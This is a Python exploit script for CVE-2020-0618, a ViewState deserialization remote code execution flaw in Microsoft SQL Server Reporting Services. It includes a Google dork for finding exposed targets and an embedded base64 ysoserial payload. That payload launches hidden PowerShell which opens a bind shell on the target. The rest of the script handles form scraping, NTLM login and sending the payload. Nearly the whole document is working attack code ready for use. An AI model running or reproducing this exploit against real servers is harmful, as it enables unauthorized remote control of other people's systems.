"""# Exploit Title: Microsoft SQL Server Reporting Services 2016 - Remote Code Execution
# Google Dork: inurl:ReportViewer.aspx
# Date: 2020-09-17
# Exploit Author: West Shepherd
# Vendor Homepage: https://www.microsoft.com
# Version: Microsoft SQL Server 2016 32-bit/x64 SP2 (CU/GDR),
#Microsoft SQL Server 2014 32-bit/x64 SP3 (CU/GDR), Microsoft SQL
#Server 2012 32-bit/x64 SP2 (QFE)
# Tested on: Windows 2016
# CVE : CVE-2020-0618
# Credit goes to Soroush Dalili
# Source:
# https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618
# https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
"""
#!/usr/bin/python
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth
import argparse, requests, logging
from bs4 import BeautifulSoup
from sys import argv, exit, stderr, stdout

# to create a payload (default is bindshell on 0.0.0.0:65535):
# .\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "command..."


class Exploit:
    payload = '/wEy4hYAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAAqAUvYyBwb3dlcnNoZWxsLmV4ZSAtZXhlYyBieXBhc3MgLW5vbmludGVyYWN0aXZlIC1ub2V4aXQgLXdpbmRvd3N0eWxlIGhpZGRlbiAtYyBpZXgoW3N5c3RlbS50ZXh0LmVuY29kaW5nXTo6ZGVmYXVsdC5nZXRzdHJpbmcoW3N5c3RlbS5jb252ZXJ0XTo6ZnJvbWJhc2U2NHN0cmluZygnSkdFOVczTjVjM1JsYlM1dVpYUXVjMjlqYTJWMGN5NTBZM0JzYVhOMFpXNWxjbDAyTlRVek5Uc2tZUzV6ZEdGeWRDZ3BPeVJqUFNSaExtRmpZMlZ3ZEhSamNHTnNhV1Z1ZENncE95UmxQU1JqTG1kbGRITjBjbVZoYlNncE8xdGllWFJsVzExZEpHYzlNQzR1TmpVMU16VjhKWHN3ZlR0M2FHbHNaU2dvSkdnOUpHVXVjbVZoWkNna1p5d3dMQ1JuTG14bGJtZDBhQ2twTFc1bElEQXBleVJzUFNodVpYY3RiMkpxWldOMElDMTBlWEJsYm1GdFpTQnplWE4wWlcwdWRHVjRkQzVoYzJOcGFXVnVZMjlrYVc1bktTNW5aWFJ6ZEhKcGJtY29KR2NzTUN3a2FDazdKRzQ5S0dsbGVDQWtiQ0F5UGlZeGZHOTFkQzF6ZEhKcGJtY3BPeVJ3UFNJa0tDUnVLU1FvS0hCM1pDa3VjR0YwYUNrK0lqc2tjVDBvVzNSbGVIUXVaVzVqYjJScGJtZGRPanBoYzJOcGFTa3VaMlYwWW5sMFpYTW9KSEFwT3lSbExuZHlhWFJsS0NSeExEQXNKSEV1YkdWdVozUm9LVHNrWlM1bWJIVnphQ2dwZlRza1l5NWpiRzl6WlNncE95UmhMbk4wYjNBb0tUc05DZz09JykpKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL'
    timeout = 100.5
    cookies = {}
    params = {}

    def __init__(self, opt):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.username = '%s\\%s' % (opt.domain, opt.username)
        self.target = '%s%s' % (opt.target, opt.path)
        self.password = opt.password
        self.session = requests.session()
        self.redirect = opt.redirect
        self.proxies = {
            'http': 'http://%s' % opt.proxy,
            'https': 'https://%s' % opt.proxy
        } if opt.proxy != '' else {}
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.form = {
            '__VIEWSTATE': '',
            'NavigationCorrector$PageState': 'NeedsCorrection',
            'NavigationCorrector$ViewState': self.payload
        }
        if opt.debug:
            self.debug()

    def info(self, message):
        stdout.write('[+] %s\n' % str(message))
        return self

    def error(self, message):
        stderr.write('[-] error: %s\n' % str(message))
        return self

    def doGet(self, url, params=None, values=None):
        self.info('sending get request to %s' % url)
        try:
            return self.session.get(
                url=url,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                data=values,
                params=params,
                auth=HttpNtlmAuth(self.username, self.password)
            ) if self.username != '\\' else self.session.get(
                url=url,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                data=values,
                params=params
            )
        except Exception as err:
            self.error(err)

    def doget(self, url, values=None, params=None):
        self.info('sending get request to %s' % url)
        try:
            return self.session.get(
                url=url,
                data=values,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                params=params,
                auth=HttpNtlmAuth(self.username, self.password)
            ) if self.username != '\\' else self.session.get(
                url=url,
                data=values,
                verify=False,
                allow_redirects=self.redirect,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                params=params
            )
        except Exception as err:
            self.error(err)

    def parsePage(self, content):
        self.info('parsing form values')
        soup = BeautifulSoup(content, 'lxml')
        for tag in soup.select('input'):
            try:
                self.form[tag['name']] = tag['value']
            except Exception as err:
                self.error(err)
        return self

    def debug(self):
        self.info('debugging enabled')
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def getForm(self):
        self.info('retrieving form values')
        resp = self.doGet(url=self.target)
        self.parsePage(content=resp.content)
        return self

    def exploit(self):
        self.info('exploiting target')
        resp = self.doget(url=self.target, params=self.params,
values=self.form)
        self.info('received response %d' % resp.status_code)
        return self


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='CVE-2020-0618 SQL Server Reporting Services ViewState Deserialization exploit', add_help=True)
    try:
        parser.add_argument('-target', action='store', help='Target address: http(s)://target.com ')
        parser.add_argument('-username', action='store', default='',help='Username to use: first.last')
        parser.add_argument('-domain', action='store', default='',help='User domain to use: domain.local')
        parser.add_argument('-password', action='store', default='',help='Password to use: Summer2020')
        parser.add_argument('-debug', action='store', default=False,help='Enable debugging: False')
        parser.add_argument('-redirect', action='store',default=False, help='Follow redirects: False')
        parser.add_argument('-proxy', action='store', default='',help='Enable proxy: 10.10.10.10:8080')
        parser.add_argument('-path', action='store',default='/ReportServer/pages/ReportViewer.aspx', help='Path to page')

        if len(argv) == 1:
            parser.print_help()
            exit(1)

        options = parser.parse_args()
        Exploit(opt=options).exploit()

    except Exception as error:
        stderr.write('[-] error in main %s\n' % str(error))
        
